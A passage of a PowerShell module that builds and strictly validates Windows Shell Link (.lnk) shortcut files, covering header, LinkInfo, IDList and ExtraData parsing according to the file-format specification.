        ($flags -band $script:LINKINFO_FLAG_NETWORK_AND_SUFFIX) -ne 0
    )

    if ($hasNetwork) {
        Throw-ShellLinkError `
            "CommonNetworkRelativeLink is not emitted or reconstructed by this implementation. Network LinkInfo is unsupported."
    }

    if ($networkOffset -ne 0) {
        Throw-ShellLinkError `
            "CommonNetworkRelativeLinkOffset is non-zero even though network links are unsupported."
    }

    Assert-LinkInfoOffset `
        -Offset $suffixOffset `
        -LinkInfoSize $size `
        -HeaderSize $headerSize `
        -Name 'CommonPathSuffixOffset'

    if ($hasLocal) {

        Assert-LinkInfoOffset `
            -Offset $volumeOffset `
            -LinkInfoSize $size `
            -HeaderSize $headerSize `
            -Name 'VolumeIDOffset'

        Assert-LinkInfoOffset `
            -Offset $baseOffset `
            -LinkInfoSize $size `
            -HeaderSize $headerSize `
            -Name 'LocalBasePathOffset'

        if ($headerSize -eq [uint32]$script:LINKINFO_HEADER_UNICODE) {

            Assert-LinkInfoOffset `
                -Offset $baseUnicodeOffset `
                -LinkInfoSize $size `
                -HeaderSize $headerSize `
                -Name 'LocalBasePathOffsetUnicode'
        }
    }
else {

        if ($volumeOffset -ne 0) {
            Throw-ShellLinkError `
                "VolumeIDOffset must be zero when VolumeIDAndLocalBasePath is clear."
        }

        if ($baseOffset -ne 0) {
            Throw-ShellLinkError `
                "LocalBasePathOffset must be zero when VolumeIDAndLocalBasePath is clear."
        }

        if (
            $headerSize -eq [uint32]$script:LINKINFO_HEADER_UNICODE -and
            $baseUnicodeOffset -ne 0
        ) {
            Throw-ShellLinkError `
                "LocalBasePathOffsetUnicode must be zero when VolumeIDAndLocalBasePath is clear."
        }
    }

    if (
        $headerSize -eq [uint32]$script:LINKINFO_HEADER_LEGACY -and
        ($baseUnicodeOffset -ne 0 -or $suffixUnicodeOffset -ne 0)
    ) {
        Throw-ShellLinkError `
            "Unicode LinkInfo offsets cannot exist in a 0x1C-byte header."
    }

    [int]$linkInfoEnd = $Offset + [int]$size

    $volume = $null
    $base = $null
    $suffix = $null
    $baseUnicode = $null
    $suffixUnicode = $null

    if ($hasLocal) {

        $volume = Parse-VolumeID `
            -Bytes $Bytes `
            -AbsoluteOffset ($Offset + [int]$volumeOffset) `
            -LinkInfoEnd $linkInfoEnd

        $base = Read-AnsiZ `
            -Bytes $Bytes `
            -Offset ($Offset + [int]$baseOffset) `
            -End $linkInfoEnd `
            -What 'LocalBasePath'

        if ($headerSize -eq [uint32]$script:LINKINFO_HEADER_UNICODE) {

            $baseUnicode = Read-UnicodeZ `
                -Bytes $Bytes `
                -Offset ($Offset + [int]$baseUnicodeOffset) `
                -End $linkInfoEnd `
                -What 'LocalBasePathUnicode'
        }
    }

    $suffix = Read-AnsiZ `
        -Bytes $Bytes `
        -Offset ($Offset + [int]$suffixOffset) `
        -End $linkInfoEnd `
        -What 'CommonPathSuffix'

    if (
        $headerSize -eq [uint32]$script:LINKINFO_HEADER_UNICODE -and
        $suffixUnicodeOffset -ne 0
    ) {

        $suffixUnicode = Read-UnicodeZ `
            -Bytes $Bytes `
            -Offset ($Offset + [int]$suffixUnicodeOffset) `
            -End $linkInfoEnd `
            -What 'CommonPathSuffixUnicode'
    }

    $ranges = New-Object 'System.Collections.Generic.List[object]'

    if ($null -ne $volume) {

        $ranges.Add(
            [pscustomobject]@{
                Name  = 'VolumeID'
                Start = [int]$volumeOffset
                End   = [int]$volumeOffset + [int]$volume.Size
            }
        )
    }

    if ($null -ne $base) {

        $ranges.Add(
            [pscustomobject]@{
                Name  = 'LocalBasePath'
                Start = [int]$baseOffset
                End   = [int]$base.End - $Offset
            }
        )
    }

    $ranges.Add(
        [pscustomobject]@{
            Name  = 'CommonPathSuffix'
            Start = [int]$suffixOffset
            End   = [int]$suffix.End - $Offset
        }
    )
if ($null -ne $baseUnicode) {

        $ranges.Add(
            [pscustomobject]@{
                Name  = 'LocalBasePathUnicode'
                Start = [int]$baseUnicodeOffset
                End   = [int]$baseUnicode.End - $Offset
            }
        )
    }

    if ($null -ne $suffixUnicode) {

        $ranges.Add(
            [pscustomobject]@{
                Name  = 'CommonPathSuffixUnicode'
                Start = [int]$suffixUnicodeOffset
                End   = [int]$suffixUnicode.End - $Offset
            }
        )
    }

    Assert-NonOverlappingRanges -Ranges $ranges.ToArray()

    $ansiTarget = $null
    $unicodeTarget = $null

    if ($null -ne $base) {
        $ansiTarget = $base.Value + $suffix.Value
    }

    if (
        $null -ne $baseUnicode -and
        $null -ne $suffixUnicode
    ) {
        $unicodeTarget = `
            $baseUnicode.Value + $suffixUnicode.Value
    }

    # PowerShell 5.1 does not support:
    #
    #     Property = if (...) { ... } else { ... }
    #
    # Calculate those values before constructing the object.
    $baseUnicodeOffsetValue = $null
    $suffixUnicodeOffsetValue = $null
    $localBasePathValue = $null
    $localBasePathUnicodeValue = $null
    $commonPathSuffixUnicodeValue = $null

    if ($headerSize -eq 0x24) {
        $baseUnicodeOffsetValue = $baseUnicodeOffset
        $suffixUnicodeOffsetValue = $suffixUnicodeOffset
    }

    if ($null -ne $base) {
        $localBasePathValue = $base.Value
    }

    if ($null -ne $baseUnicode) {
        $localBasePathUnicodeValue = $baseUnicode.Value
    }

    if ($null -ne $suffixUnicode) {
        $commonPathSuffixUnicodeValue = $suffixUnicode.Value
    }

    return [pscustomobject]@{
        Offset                          = $Offset
        Size                            = $size
        HeaderSize                      = $headerSize
        Flags                           = $flags

        VolumeIDOffset                  = $volumeOffset
        LocalBasePathOffset             = $baseOffset
        CommonNetworkRelativeLinkOffset = $networkOffset
        CommonPathSuffixOffset          = $suffixOffset

        LocalBasePathOffsetUnicode      = $baseUnicodeOffsetValue
        CommonPathSuffixOffsetUnicode   = $suffixUnicodeOffsetValue

        VolumeID                        = $volume

        LocalBasePath                   = $localBasePathValue
        CommonPathSuffix                = $suffix.Value

        LocalBasePathUnicode            = $localBasePathUnicodeValue
        CommonPathSuffixUnicode         = $commonPathSuffixUnicodeValue

        ReconstructedAnsiTarget         = $ansiTarget
        ReconstructedUnicodeTarget      = $unicodeTarget

        EndOffset                       = $linkInfoEnd
    }
}
# ============================================================================
# Header metadata
# ============================================================================

function Get-TargetMetadata {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetPath
    )

    [uint32]$fileSize = 0
    [uint64]$creation = 0
    [uint64]$access = 0
    [uint64]$write = 0

    try {

        $item = Get-Item `
            -LiteralPath $TargetPath `
            -Force `
            -ErrorAction Stop

        if (-not $item.PSIsContainer) {

            [uint64]$length = [uint64]$item.Length

            # 0xFFFFFFFF parses as a negative Int32 on some runtimes; the
            # decimal Int64 form masks the low 32 bits unambiguously.
            $fileSize = [uint32]($length -band 4294967295)
        }

        try {
            $creation = [uint64]$item.CreationTimeUtc.ToFileTimeUtc()
        }
        catch {
            $creation = 0
        }

        try {
            $access = [uint64]$item.LastAccessTimeUtc.ToFileTimeUtc()
        }
        catch {
            $access = 0
        }

        try {
            $write = [uint64]$item.LastWriteTimeUtc.ToFileTimeUtc()
        }
        catch {
            $write = 0
        }
    }
    catch {
        # A Linux generator normally cannot stat a Windows C:\ path.
        # Zero metadata is explicitly supported by ShellLinkHeader.
    }

    return [pscustomobject]@{
        FileSize     = $fileSize
        CreationTime = $creation
        AccessTime   = $access
        WriteTime    = $write
    }
}

# ============================================================================
# FileAttributes validation
# ============================================================================

function Validate-FileAttributes {
    param(
        [Parameter(Mandatory = $true)]
        [uint32]$Attributes
    )

    if (($Attributes -band $script:FILE_ATTR_UNDEFINED_MASK) -ne 0) {

        Throw-ShellLinkError `
            ("FileAttributes contains undefined high bits: 0x{0:X8}" -f $Attributes)
    }

    if (($Attributes -band $script:FILE_ATTR_RESERVED_MASK) -ne 0) {

        Throw-ShellLinkError `
            "FileAttributes contains a non-zero reserved bit."
    }

    if (($Attributes -band $script:FILE_ATTR_NORMAL) -ne 0) {

        $other = $Attributes -band `
            ([uint32]0x00007FB7 -bxor $script:FILE_ATTR_NORMAL)

        if ($other -ne 0) {

            Throw-ShellLinkError `
                "FILE_ATTRIBUTE_NORMAL is set while another file-attribute bit is also set."
        }
    }
}

# ============================================================================
# HotKey validation
# ============================================================================

function Test-ValidHotKeyVirtualKey {
    param(
        [Parameter(Mandatory = $true)]
        [byte]$VirtualKey
    )

    if ($VirtualKey -eq 0) {
        return $true
    }

    if ($VirtualKey -ge 0x30 -and $VirtualKey -le 0x39) {
        return $true
    }

    if ($VirtualKey -ge 0x41 -and $VirtualKey -le 0x5A) {
        return $true
    }

    if ($VirtualKey -ge 0x70 -and $VirtualKey -le 0x87) {
        return $true
    }

    return (
        $VirtualKey -eq 0x90 -or
        $VirtualKey -eq 0x91
    )
}

function Validate-HotKey {
    param(
        [Parameter(Mandatory = $true)]
        [uint16]$HotKey
    )

    [byte]$vk = [byte]($HotKey -band 0xFF)
    [byte]$mods = [byte](($HotKey -shr 8) -band 0xFF)

    if (-not (Test-ValidHotKeyVirtualKey -VirtualKey $vk)) {

        Throw-ShellLinkError `
            ("Invalid HotKey virtual-key code: 0x{0:X2}" -f $vk)
    }

    if (($mods -band 0xF8) -ne 0) {

        Throw-ShellLinkError `
            ("Invalid HotKey modifier bits: 0x{0:X2}" -f $mods)
    }
}
# ============================================================================
# ShellLinkHeader writer
# ============================================================================

function New-ShellLinkHeader {
    param(
        [Parameter(Mandatory = $true)]
        [uint32]$LinkFlags,

        [Parameter(Mandatory = $true)]
        [string]$TargetPath,

        [uint32]$FileAttributes = $script:FILE_ATTR_ARCHIVE,

        [int32]$IconIndex = 0,

        [uint32]$ShowCommand = 1,

        [uint16]$HotKey = 0
    )

    Validate-FileAttributes -Attributes $FileAttributes
    Validate-HotKey -HotKey $HotKey

    $metadata = Get-TargetMetadata -TargetPath $TargetPath

    $buffer = New-ByteList

    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]0x4C)

    foreach ($b in $script:SHELL_LINK_CLSID) {
        $buffer.Add($b)
    }

    Write-U32 `
        -Buffer $buffer `
        -Value $LinkFlags

    Write-U32 `
        -Buffer $buffer `
        -Value $FileAttributes

    Write-U64 `
        -Buffer $buffer `
        -Value $metadata.CreationTime

    Write-U64 `
        -Buffer $buffer `
        -Value $metadata.AccessTime

    Write-U64 `
        -Buffer $buffer `
        -Value $metadata.WriteTime

    Write-U32 `
        -Buffer $buffer `
        -Value $metadata.FileSize

    # IconIndex is signed in the specification, but the on-disk field is
    # still a four-byte little-endian integer.
    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]$IconIndex)

    Write-U32 `
        -Buffer $buffer `
        -Value $ShowCommand

    Write-U16 `
        -Buffer $buffer `
        -Value $HotKey

    # Reserved1
    Write-U16 `
        -Buffer $buffer `
        -Value ([uint16]0)

    # Reserved2
    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]0)

    # Reserved3
    Write-U32 `
        -Buffer $buffer `
        -Value ([uint32]0)

    [byte[]]$result = [byte[]]$buffer.ToArray()

    if ($result.Length -ne $script:SHELL_LINK_HEADER_SIZE) {

        Throw-ShellLinkError `
            "Internal ShellLinkHeader size mismatch."
    }

    return $result
}
# ============================================================================
# Write-ShellLink
# ============================================================================

function Write-ShellLink {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [Parameter(Mandatory = $true)]
        [hashtable]$Spec,

        [uint32]$ShowCommand = 1,

        # For a RELATIVE-target shortcut, also embed a minimal (empty) relative
        # LinkInfo block and set the HasLinkInfo flag. Explorer otherwise cannot
        # resolve a bare relative target (flags end up 0x000000CC alone) and a
        # double-click silently does nothing. Only launcher-mode relative .lnk
        # files opt in; absolute-target shortcuts are unaffected.
        [switch]$RelativeLinkInfo
    )

    if (-not $Spec.ContainsKey('TargetPath')) {

        Throw-ShellLinkError `
            "Write-ShellLink: Spec.TargetPath is required."
    }

    [string]$targetInput = [string]$Spec.TargetPath

    if ([string]::IsNullOrWhiteSpace($targetInput)) {

        Throw-ShellLinkError `
            "Write-ShellLink: TargetPath cannot be empty."
    }

    $parts = Split-WindowsLocalTarget -TargetPath $targetInput

    $hasDescription = $Spec.ContainsKey('Description')
    $hasRelativePath = $Spec.ContainsKey('RelativePath')
    $hasWorkingDirectory = $Spec.ContainsKey('WorkingDirectory')
    $hasArguments = $Spec.ContainsKey('Arguments')
    $hasIconLocation = $Spec.ContainsKey('IconLocation')

    [string]$description = ''
    [string]$relativePath = ''
    [string]$workingDirectory = ''
    [string]$arguments = ''
    [string]$iconLocation = ''

    if ($hasDescription) {
        $description = [string]$Spec.Description
    }

    if ($hasRelativePath) {

        $relativePath = Normalize-WindowsPath `
            -Path ([string]$Spec.RelativePath)
    }
    elseif ($parts.IsRelative) {

        $relativePath = Normalize-WindowsPath `
            -Path $parts.FullPath

        $hasRelativePath = $true
    }

    if ($hasWorkingDirectory) {

        $workingDirectory = Normalize-WindowsPath `
            -Path ([string]$Spec.WorkingDirectory)
    }

    if ($hasArguments) {
        $arguments = [string]$Spec.Arguments
    }

    if ($hasIconLocation) {

        $iconLocation = Normalize-WindowsPath `
            -Path ([string]$Spec.IconLocation)
    }

    [int32]$iconIndex = 0

    if ($Spec.ContainsKey('IconIndex')) {
        $iconIndex = [int32]$Spec.IconIndex
    }

    if ($Spec.ContainsKey('ShowCommand')) {
        $ShowCommand = [uint32]$Spec.ShowCommand
    }

    [uint16]$hotKey = 0

    if ($Spec.ContainsKey('HotKey')) {
        $hotKey = [uint16]$Spec.HotKey
    }
# ------------------------------------------------------------------------
    # LinkFlags
    # ------------------------------------------------------------------------

    [uint32]$flags = $script:FLAG_IS_UNICODE

    if ($parts.IsRelative) {

        $flags = $flags -bor $script:FLAG_HAS_RELATIVE_PATH

        # A relative-target launcher .lnk additionally carries a minimal
        # relative LinkInfo block + HasLinkInfo so Explorer resolves the target
        # against the shortcut's own folder. Without HasLinkInfo Windows cannot
        # resolve a bare relative path (flags alone end up 0x000000CC) and a
        # double-click silently does nothing (no UAC, no staging).
        if ($RelativeLinkInfo) {

            $flags = $flags -bor $script:FLAG_HAS_LINKINFO
        }
    }
    else {

        $flags = $flags -bor $script:FLAG_HAS_LINKINFO
    }

    # An explicitly supplied RelativePath StringData sets the flag even for an
    # absolute LinkInfo target (both can coexist in the file).
    if ($hasRelativePath) {

        $flags = $flags -bor $script:FLAG_HAS_RELATIVE_PATH
    }

    if ($hasDescription) {
        $flags = $flags -bor $script:FLAG_HAS_NAME
    }

    if ($hasWorkingDirectory) {
        $flags = $flags -bor $script:FLAG_HAS_WORKING_DIR
    }

    if ($hasArguments) {
        $flags = $flags -bor $script:FLAG_HAS_ARGUMENTS
    }

    if ($hasIconLocation) {
        $flags = $flags -bor $script:FLAG_HAS_ICON_LOCATION
    }

    # A drive-rooted ASCII file target additionally gets a LinkTargetIDList.
    # Windows resolves Shortcut.TargetPath (IShellLink::GetPath) from this
    # IDList; a LinkInfo-only .lnk returns an empty TargetPath even when all
    # path strings are correctly stored on disk. Directory/root targets and
    # non-ASCII paths keep the previous LinkInfo-only behaviour.
    $idListObject = $null

    if (
        -not $parts.IsRelative -and
        -not [string]::IsNullOrEmpty($parts.Suffix)
    ) {

        $idListEligible = $true

        foreach ($ch in ($parts.BasePath.ToCharArray() + $parts.Suffix.ToCharArray())) {
            if ([int]$ch -gt 127) {
                $idListEligible = $false
                break
            }
        }

        if ($idListEligible) {

            $idListObject = New-LinkTargetIDList `
                -BasePath $parts.BasePath `
                -Suffix $parts.Suffix

            $flags = $flags -bor $script:FLAG_HAS_IDLIST
        }
    }

    # ------------------------------------------------------------------------
    # FileAttributes
    # ------------------------------------------------------------------------

    [uint32]$attributes = $script:FILE_ATTR_ARCHIVE

    if ($targetInput -match '[\\/]$') {
        $attributes = $script:FILE_ATTR_DIRECTORY
    }

    if ($Spec.ContainsKey('FileAttributes')) {
        $attributes = [uint32]$Spec.FileAttributes
    }

    # ------------------------------------------------------------------------
    # Header
    # ------------------------------------------------------------------------

    $header = New-ShellLinkHeader `
        -LinkFlags $flags `
        -TargetPath $parts.FullPath `
        -FileAttributes $attributes `
        -IconIndex $iconIndex `
        -ShowCommand $ShowCommand `
        -HotKey $hotKey

    $chunks = New-Object 'System.Collections.Generic.List[byte[]]'

    $chunks.Add($header)

    # ------------------------------------------------------------------------
    # LinkTargetIDList (must precede LinkInfo in the file)
    # ------------------------------------------------------------------------

    if ($null -ne $idListObject) {
        $chunks.Add($idListObject.Bytes)
    }

    # ------------------------------------------------------------------------
    # LinkInfo for local absolute target
    # ------------------------------------------------------------------------

    if (-not $parts.IsRelative) {

        $linkInfo = New-LinkInfo `
            -BasePath $parts.BasePath `
            -Suffix $parts.Suffix `
            -TargetPath $parts.FullPath

        $chunks.Add($linkInfo)
    }
    elseif ($RelativeLinkInfo) {

        # Minimal relative LinkInfo (VolumeIDAndLocalBasePath clear, all path
        # offsets zero, empty CommonPathSuffix). Explorer combines this stub
        # with the RELATIVE_PATH StringData to resolve the sibling target.
        $chunks.Add((New-RelativeLinkInfo))
    }

    # ------------------------------------------------------------------------
    # StringData in exact ABNF order
    # ------------------------------------------------------------------------

    if ($hasDescription) {

        $chunks.Add(
            (New-StringData -Value $description)
        )
    }

    if ($hasRelativePath) {

        $chunks.Add(
            (New-StringData -Value $relativePath)
        )
    }

    if ($hasWorkingDirectory) {

        $chunks.Add(
            (New-StringData -Value $workingDirectory)
        )
    }

    if ($hasArguments) {

        $chunks.Add(
            (New-StringData -Value $arguments)
        )
    }

    if ($hasIconLocation) {

        $chunks.Add(
            (New-StringData -Value $iconLocation)
        )
    }

    # ------------------------------------------------------------------------
    # No ExtraData blocks are emitted.
    #
    # TerminalBlock:
    #   DWORD 0
    # ------------------------------------------------------------------------

    $chunks.Add(
        [byte[]]@(0x00, 0x00, 0x00, 0x00)
    )

    [byte[]]$output = Join-ByteArrays `
        -Arrays $chunks.ToArray()

    if ($output.Length -lt ($script:SHELL_LINK_HEADER_SIZE + 4)) {

        Throw-ShellLinkError `
            "Generated Shell Link is unexpectedly short."
    }

    Write-AllBytesAtomic `
        -Path $Path `
        -Bytes $output | Out-Null

    return $output.Length
}
# ============================================================================
# LinkTargetIDList parser
# ============================================================================

function Parse-LinkTargetIDList {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 2 `
        -What 'IDListSize'

    [uint16]$size = Read-U16 `
        -Bytes $Bytes `
        -Offset $Offset

    if ($size -lt 2) {

        Throw-ShellLinkError `
            "IDListSize must include at least the terminating TerminalID."
    }

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset ($Offset + 2) `
        -Length ([int]$size) `
        -What 'LinkTargetIDList'

    [int]$listStart = $Offset + 2
    [int]$listEnd = $listStart + [int]$size
    [int]$position = $listStart

    $items = New-Object 'System.Collections.Generic.List[object]'
    $terminalFound = $false

    while ($position -lt $listEnd) {

        if (($listEnd - $position) -lt 2) {

            Throw-ShellLinkError `
                "IDList ends before a complete ItemIDSize field."
        }

        [uint16]$itemSize = Read-U16 `
            -Bytes $Bytes `
            -Offset $position

        if ($itemSize -eq 0) {

            if (($position + 2) -ne $listEnd) {

                Throw-ShellLinkError `
                    "TerminalID is not the final ItemID in IDList."
            }

            $terminalFound = $true
            $position += 2
            break
        }

        if ($itemSize -lt 2) {

            Throw-ShellLinkError `
                "ItemIDSize is smaller than the ItemID size field itself."
        }

        if (($position + [int]$itemSize) -gt $listEnd) {

            Throw-ShellLinkError `
                "ItemID extends beyond IDListSize."
        }

        [int]$dataCount = [int]$itemSize - 2

        [byte[]]$data = New-Object byte[] $dataCount

        if ($dataCount -gt 0) {
            [System.Array]::Copy(
                $Bytes,
                $position + 2,
                $data,
                0,
                $dataCount
            )
        }

        $items.Add(
            [pscustomobject]@{
                Offset = $position
                Size   = $itemSize
                Data   = $data
            }
        )

        $position += [int]$itemSize
    }

    if (-not $terminalFound) {

        Throw-ShellLinkError `
            "IDList reaches its declared end without a terminating zero ItemID."
    }

    if ($position -ne $listEnd) {

        Throw-ShellLinkError `
            "IDList parser did not consume exactly IDListSize bytes."
    }

    return [pscustomobject]@{
        Offset    = $Offset
        Size      = $size
        Items     = $items.ToArray()
        ItemCount = $items.Count
        EndOffset = $listEnd
    }
}
# ============================================================================
# ExtraData parser
# ============================================================================

function Validate-ExtraDataBlock {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [uint32]$BlockSize,

        [Parameter(Mandatory = $true)]
        [uint32]$Signature
    )

    if ($BlockSize -lt 8) {

        Throw-ShellLinkError `
            "ExtraDataBlock is smaller than its size and signature fields."
    }

    switch ($Signature) {

        $script:EXTRA_ENVIRONMENT {

            if ($BlockSize -ne 0x314) {

                Throw-ShellLinkError `
                    "EnvironmentVariableDataBlock must be 0x314 bytes."
            }
        }

        $script:EXTRA_TRACKER {

            if ($BlockSize -ne 0x60) {

                Throw-ShellLinkError `
                    "TrackerDataBlock must be 0x60 bytes."
            }

            [uint32]$length = Read-U32 `
                -Bytes $Bytes `
                -Offset ($Offset + 8)

            if ($length -ne 0x58) {

                Throw-ShellLinkError `
                    "TrackerDataBlock Length must be 0x58."
            }

            [uint32]$version = Read-U32 `
                -Bytes $Bytes `
                -Offset ($Offset + 12)

            if ($version -ne 0) {

                Throw-ShellLinkError `
                    "TrackerDataBlock Version must be zero."
            }
        }

        $script:EXTRA_CONSOLE {

            if ($BlockSize -lt 0xCC) {

                Throw-ShellLinkError `
                    "ConsoleDataBlock is smaller than the documented minimum."
            }
        }

        $script:EXTRA_CONSOLE_FE {

            if ($BlockSize -lt 0x0C) {

                Throw-ShellLinkError `
                    "ConsoleFEDataBlock is too small."
            }
        }

        $script:EXTRA_SPECIAL_FOLDER {

            if ($BlockSize -ne 0x10) {

                Throw-ShellLinkError `
                    "SpecialFolderDataBlock must be 0x10 bytes."
            }
        }

        $script:EXTRA_DARWIN {

            if ($BlockSize -ne 0x314) {

                Throw-ShellLinkError `
                    "DarwinDataBlock must be 0x314 bytes."
            }
        }

        $script:EXTRA_ICON_ENVIRONMENT {

            if ($BlockSize -ne 0x314) {

                Throw-ShellLinkError `
                    "IconEnvironmentDataBlock must be 0x314 bytes."
            }
        }

        $script:EXTRA_SHIM {

            if ($BlockSize -lt 0x88) {

                Throw-ShellLinkError `
                    "ShimDataBlock is smaller than the documented minimum."
            }
        }

        $script:EXTRA_PROPERTY_STORE {

            if ($BlockSize -lt 0x0C) {

                Throw-ShellLinkError `
                    "PropertyStoreDataBlock is too small."
            }
        }

        $script:EXTRA_KNOWN_FOLDER {

            if ($BlockSize -ne 0x1C) {

                Throw-ShellLinkError `
                    "KnownFolderDataBlock must be 0x1C bytes."
            }
        }

        $script:EXTRA_VISTA_IDLIST {

            if ($BlockSize -lt 0x0A) {

                Throw-ShellLinkError `
                    "VistaAndAboveIDListDataBlock is too small."
            }
        }

        default {

            Throw-ShellLinkError `
                ("Unsupported ExtraDataBlock signature 0x{0:X8}." -f $Signature)
        }
    }
}
function Parse-ExtraData {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset
    )

    [int]$position = $Offset

    $blocks = New-Object 'System.Collections.Generic.List[object]'
    $terminalFound = $false

    while ($position -lt $Bytes.Length) {

        if (($Bytes.Length - $position) -lt 4) {

            Throw-ShellLinkError `
                "ExtraData does not have enough bytes for a TerminalBlock."
        }

        [uint32]$blockSize = Read-U32 `
            -Bytes $Bytes `
            -Offset $position

        if ($blockSize -eq 0) {

            if (($position + 4) -ne $Bytes.Length) {

                Throw-ShellLinkError `
                    "Bytes exist after TerminalBlock."
            }

            $terminalFound = $true

            return [pscustomobject]@{
                Offset         = $Offset
                Blocks         = $blocks.ToArray()
                BlockCount     = $blocks.Count
                TerminalOffset = $position
                EndOffset      = $position + 4
            }
        }

        if ($blockSize -lt 8) {

            Throw-ShellLinkError `
                "ExtraDataBlock size must be at least 8 bytes."
        }

        if ($blockSize -gt [uint32]($Bytes.Length - $position)) {

            Throw-ShellLinkError `
                "ExtraDataBlock extends beyond the file."
        }

        [uint32]$signature = Read-U32 `
            -Bytes $Bytes `
            -Offset ($position + 4)

        Validate-ExtraDataBlock `
            -Bytes $Bytes `
            -Offset $position `
            -BlockSize $blockSize `
            -Signature $signature

        [byte[]]$raw = Slice-Bytes `
            -Bytes $Bytes `
            -Offset $position `
            -Length ([int]$blockSize)

        $blocks.Add(
            [pscustomobject]@{
                Offset    = $position
                Size      = $blockSize
                Signature = $signature
                Bytes     = $raw
                EndOffset = $position + [int]$blockSize
            }
        )

        $position += [int]$blockSize
    }

    if (-not $terminalFound) {

        Throw-ShellLinkError `
            "ExtraData reached the end of the file without TerminalBlock."
    }
}
# ============================================================================
# ShellLinkHeader parser
# ============================================================================

function Parse-ShellLinkHeader {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes
    )

    if ($Bytes.Length -lt $script:SHELL_LINK_HEADER_SIZE) {

        Throw-ShellLinkError `
            "File is shorter than the mandatory ShellLinkHeader."
    }

    [uint32]$headerSize = Read-U32 `
        -Bytes $Bytes `
        -Offset 0

    if ($headerSize -ne 0x4C) {

        Throw-ShellLinkError `
            ("HeaderSize must be 0x4C, got 0x{0:X8}." -f $headerSize)
    }

    for ($i = 0; $i -lt 16; $i++) {

        if ($Bytes[4 + $i] -ne $script:SHELL_LINK_CLSID[$i]) {

            Throw-ShellLinkError `
                "LinkCLSID is not 00021401-0000-0000-C000-000000000046."
        }
    }

    [uint32]$flags = Read-U32 `
        -Bytes $Bytes `
        -Offset 20

    if (($flags -band $script:LINKFLAGS_UNDEFINED_MASK) -ne 0) {

        Throw-ShellLinkError `
            ("LinkFlags contains undefined bits outside A..AA: 0x{0:X8}" -f $flags)
    }

    [uint32]$attributes = Read-U32 `
        -Bytes $Bytes `
        -Offset 24

    Validate-FileAttributes -Attributes $attributes

    [uint64]$creation = Read-U64 `
        -Bytes $Bytes `
        -Offset 28

    [uint64]$access = Read-U64 `
        -Bytes $Bytes `
        -Offset 36

    [uint64]$write = Read-U64 `
        -Bytes $Bytes `
        -Offset 44

    [uint32]$fileSize = Read-U32 `
        -Bytes $Bytes `
        -Offset 52

    [int32]$iconIndex = [int32](
        Read-U32 `
            -Bytes $Bytes `
            -Offset 56
    )

    [uint32]$showCommand = Read-U32 `
        -Bytes $Bytes `
        -Offset 60

    [uint16]$hotKey = Read-U16 `
        -Bytes $Bytes `
        -Offset 64

    Validate-HotKey -HotKey $hotKey

    [uint16]$reserved1 = Read-U16 `
        -Bytes $Bytes `
        -Offset 66

    [uint32]$reserved2 = Read-U32 `
        -Bytes $Bytes `
        -Offset 68

    [uint32]$reserved3 = Read-U32 `
        -Bytes $Bytes `
        -Offset 72

    if ($reserved1 -ne 0) {
        Throw-ShellLinkError "Reserved1 must be zero."
    }

    if ($reserved2 -ne 0) {
        Throw-ShellLinkError "Reserved2 must be zero."
    }

    if ($reserved3 -ne 0) {
        Throw-ShellLinkError "Reserved3 must be zero."
    }

    return [pscustomobject]@{
        HeaderSize     = $headerSize
        LinkCLSID      = '00021401-0000-0000-C000-000000000046'
        LinkFlags      = $flags
        FileAttributes = $attributes
        CreationTime   = $creation
        AccessTime     = $access
        WriteTime      = $write
        FileSize       = $fileSize
        IconIndex      = $iconIndex
        ShowCommand    = $showCommand
        HotKey         = $hotKey
        Reserved1      = $reserved1
        Reserved2      = $reserved2
        Reserved3      = $reserved3
    }
}
# ============================================================================
# Validate-ShellLink
# ============================================================================

function Validate-ShellLink {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [AllowEmptyString()]
        [string]$ExpectedTarget,

        [hashtable]$ExpectedSpec
    )

    [byte[]]$bytes = Read-AllBytes -Path $Path

    $header = Parse-ShellLinkHeader -Bytes $bytes

    [uint32]$flags = $header.LinkFlags

    $hasIdList = (
        ($flags -band $script:FLAG_HAS_IDLIST) -ne 0
    )

    $hasLinkInfo = (
        ($flags -band $script:FLAG_HAS_LINKINFO) -ne 0
    )

    $hasName = (
        ($flags -band $script:FLAG_HAS_NAME) -ne 0
    )

    $hasRelativePath = (
        ($flags -band $script:FLAG_HAS_RELATIVE_PATH) -ne 0
    )

    $hasWorkingDir = (
        ($flags -band $script:FLAG_HAS_WORKING_DIR) -ne 0
    )

    $hasArguments = (
        ($flags -band $script:FLAG_HAS_ARGUMENTS) -ne 0
    )

    $hasIcon = (
        ($flags -band $script:FLAG_HAS_ICON_LOCATION) -ne 0
    )

    $isUnicode = (
        ($flags -band $script:FLAG_IS_UNICODE) -ne 0
    )

    $forceNoLinkInfo = (
        ($flags -band $script:FLAG_FORCE_NO_LINKINFO) -ne 0
    )

    $position = $script:SHELL_LINK_HEADER_SIZE

    $idList = $null
    $linkInfo = $null

    # ------------------------------------------------------------------------
    # LinkTargetIDList
    # ------------------------------------------------------------------------

    if ($hasIdList) {

        $idList = Parse-LinkTargetIDList `
            -Bytes $bytes `
            -Offset $position

        $idListPath = ConvertFrom-LinkTargetIDList `
            -Items $idList.Items

        $idList | Add-Member `
            -MemberType NoteProperty `
            -Name ReconstructedPath `
            -Value ([string]$idListPath) `
            -Force

        $position = $idList.EndOffset
    }

    # ------------------------------------------------------------------------
    # LinkInfo
    # ------------------------------------------------------------------------

    if ($hasLinkInfo) {

        $linkInfo = Parse-LinkInfo `
            -Bytes $bytes `
            -Offset $position

        $position = $linkInfo.EndOffset
    }

    # ------------------------------------------------------------------------
    # StringData
    # ------------------------------------------------------------------------

    $nameData = $null
    $relativeData = $null
    $workingData = $null
    $argumentsData = $null
